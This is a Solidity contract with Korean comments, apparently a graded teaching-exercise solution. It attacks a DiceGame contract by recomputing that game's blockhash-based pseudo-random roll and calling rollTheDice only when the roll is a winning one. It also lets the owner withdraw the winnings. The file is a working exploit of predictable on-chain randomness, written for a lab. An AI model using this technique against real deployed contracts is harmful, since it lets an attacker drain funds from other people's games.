pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";
import "./DiceGame.sol";
import "hardhat/console.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    address private _address;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
        _address = diceGameAddress;
    }

    // 특정 계정으로 잔액 인출
    function withdraw(address payable specifiedAddress, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Address balance is under the amount");
        specifiedAddress.transfer(amount);
    }

    // DiceGame 컨트랙트에서 난수를 예측하여 이길 수 있을 때만 주사위를 굴림
    function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "Not enough ether");

        // DiceGame.sol의 rollTheDice 함수와 동일하게 주사위 결과 값 도출
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        console.log("\t", "   Rigged Roll", block.number, roll);

        // 0,1,2,3,4,5가 나오면 DiceGame.sol의 rollTheDice 실행
        require(roll <= 5, "Failed");
        diceGame.rollTheDice{value: msg.value}();
    }

    receive() external payable {}   
}
